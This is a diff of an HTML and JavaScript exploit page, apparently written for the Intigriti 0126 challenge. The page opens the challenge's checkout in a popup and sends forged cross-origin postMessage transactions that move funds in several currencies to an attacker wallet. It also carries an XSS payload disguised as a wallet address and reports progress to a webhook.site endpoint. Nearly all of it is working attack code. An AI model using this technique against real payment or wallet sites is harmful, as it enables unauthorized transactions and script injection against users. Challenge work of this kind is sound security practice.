@@ -1,19 +1,22 @@
 <!DOCTYPE html>
 <html>
 <head>
-    <title>Intigriti 0126 - Debug Exploit</title>
+    <title>Intigriti 0126 - Multi-Currency Test</title>
     <meta charset="UTF-8">
     <style>body{font-family:monospace;background:#0a0a0a;color:#00ff00;padding:20px;}</style>
 </head>
 <body>
-    <h1>DEBUG EXPLOIT</h1>
-    <div id="log">Starting debug...</div>
+    <h1>EXPLOIT - Multi Currency</h1>
+    <div id="log">Starting...</div>
 
     <script>
         const BASE = 'https://challenge-0126.intigriti.io';
-        const WEBHOOK = 'https://webhook.site/2dab0d49-91b3-44a1-917f-c4332d3d3814';
+        const WEBHOOK = 'https://webhook.site/468bec37-fda7-4e34-9511-3688c97cf804';
         const YOUR_WALLET = '1cc4a7735c998cb4b4e390e97c349281d2';
-        const CURRENCY = '1337COIN';
+        const XSS_WALLET = '"><img src=x onerror="alert(\'gigawatz\')">';
+
+        // Try ALL currencies - admin might not have 1337COIN wallet
+        const CURRENCIES = ['BTC', 'ETH', 'XMR', '1337COIN'];
 
         function log(msg) {
             document.getElementById('log').innerHTML += '<br>' + msg;
@@ -27,115 +30,92 @@
 
         track('start', 'loaded', {});
 
-        // Try different methods and report which one works
-        const methods = [];
+        let popup = null;
+        let currentCurrencyIndex = 0;
 
-        // Method 1: Check for window.opener
-        if (window.opener && !window.opener.closed) {
-            log('[METHOD 1] Found window.opener');
-            track('opener_found', 'success', {});
-            methods.push('opener');
-        }
+        function testNextCurrency() {
+            if (currentCurrencyIndex >= CURRENCIES.length) {
+                log('All currencies tested!');
+                track('all_tested', 'done', { count: CURRENCIES.length });
+                return;
+            }
 
-        // Method 2: Check for window.parent
-        if (window.parent && window.parent !== window) {
-            log('[METHOD 2] Found window.parent');
-            track('parent_found', 'success', {});
-            methods.push('parent');
-        }
+            const currency = CURRENCIES[currentCurrencyIndex];
+            log(`Testing ${currency}...`);
+            track('testing_currency', 'start', { currency });
 
-        // Method 3: Try popup
-        log('[METHOD 3] Trying popup...');
-        const popup = window.open(
-            `${BASE}/checkout.html?currency=${CURRENCY}&price=1000000`,
-            'checkout',
-            'width=1000,height=800'
-        );
+            // Open popup with this currency
+            if (popup && !popup.closed) {
+                popup.close();
+            }
 
-        if (popup) {
-            log('[SUCCESS] Popup opened!');
-            track('popup_opened', 'success', {});
-            methods.push('popup');
+            popup = window.open(
+                `${BASE}/checkout.html?currency=${currency}&price=100`,
+                'checkout',
+                'width=1000,height=800'
+            );
 
-            // Poll popup status
-            let checks = 0;
-            const pollPopup = setInterval(() => {
-                checks++;
-                try {
-                    // Try to get popup location
-                    const popupLoc = popup.location.href;
-                    track('popup_status', 'ok', {
-                        url: popupLoc.substring(0, 50),
-                        check: checks
-                    });
-                    log(`Check ${checks}: ${popupLoc.substring(0, 50)}...`);
+            if (!popup) {
+                log('Popup blocked!');
+                track('popup_blocked', 'failed', {});
+                return;
+            }
 
-                    // If still on checkout after 5 seconds, try sending
-                    if (checks >= 5 && popupLoc.includes('checkout')) {
-                        log('Popup is on checkout - SENDING postMessage...');
-                        track('sending_to_popup', 'start', {});
+            track('popup_opened', 'success', { currency });
 
-                        popup.postMessage({
-                            type: 'submitTransaction',
-                            transaction: {
-                                toAddress: YOUR_WALLET,
-                                currency: CURRENCY,
-                                amount: 1337
-                            }
-                        }, '*');
+            // Wait and send transaction
+            setTimeout(() => {
+                log(`Sending ${currency} transaction...`);
+                track('sending', 'start', { currency });
 
-                        track('tx_sent', 'done', { method: 'popup' });
-                        log('postMessage sent to popup!');
-                        clearInterval(pollPopup);
+                // Send transaction to our wallet
+                popup.postMessage({
+                    type: 'submitTransaction',
+                    transaction: {
+                        toAddress: YOUR_WALLET,
+                        currency: currency,
+                        amount: 1
                     }
-                } catch(e) {
-                    // Cross-origin - can't read location
-                    track('popup_cross_origin', 'expected', { check: checks });
+                }, '*');
 
-                    if (checks >= 8) {
-                        log('Popup should be loaded - SENDING postMessage...');
-                        track('sending_blind', 'start', { check: checks });
+                track('tx_sent', 'done', { currency, to: YOUR_WALLET });
+                log(`${currency} transaction sent!`);
 
-                        popup.postMessage({
-                            type: 'submitTransaction',
-                            transaction: {
-                                toAddress: YOUR_WALLET,
-                                currency: CURRENCY,
-                                amount: 1337
-                            }
-                        }, '*');
+                // Move to next currency after delay
+                setTimeout(() => {
+                    currentCurrencyIndex++;
+                    testNextCurrency();
+                }, 5000);
 
-                        track('tx_sent_blind', 'done', {});
-                        log('postMessage sent (blind)!');
-                        clearInterval(pollPopup);
-                    }
-                }
-
-                if (checks >= 15) {
-                    clearInterval(pollPopup);
-                    track('poll_timeout', 'done', { checks });
-                }
-            }, 1000);
-        } else {
-            log('[FAILED] Popup blocked!');
-            track('popup_blocked', 'failed', {});
+            }, 10000); // 10 second wait per currency
         }
 
-        // Listen for ANY messages
+        // Also try XSS with the last currency
+        function sendXSS(currency) {
+            log(`Sending XSS with ${currency}...`);
+            track('sending_xss', 'start', { currency });
+
+            popup.postMessage({
+                type: 'submitTransaction',
+                transaction: {
+                    toAddress: XSS_WALLET,
+                    currency: currency,
+                    amount: 1
+                }
+            }, '*');
+
+            track('xss_sent', 'done', { currency });
+            log('XSS transaction sent!');
+        }
+
+        // Start testing
+        setTimeout(testNextCurrency, 2000);
+
+        // Listen for responses
         window.addEventListener('message', (event) => {
-            log(`[RECEIVED MESSAGE] ${JSON.stringify(event.data).substring(0, 100)}`);
-            track('msg_received', 'info', {
-                data: JSON.stringify(event.data).substring(0, 200),
-                origin: event.origin
-            });
+            log(`[MSG] ${JSON.stringify(event.data).substring(0, 100)}`);
+            track('msg_received', 'info', event.data);
         });
-
-        // Summary after 15 seconds
-        setTimeout(() => {
-            log('=== DEBUG SUMMARY ===');
-            log(`Methods available: ${methods.join(', ') || 'none'}`);
-            track('summary', 'done', { methods });
-        }, 15000);
     </script>
 </body>
 </html>
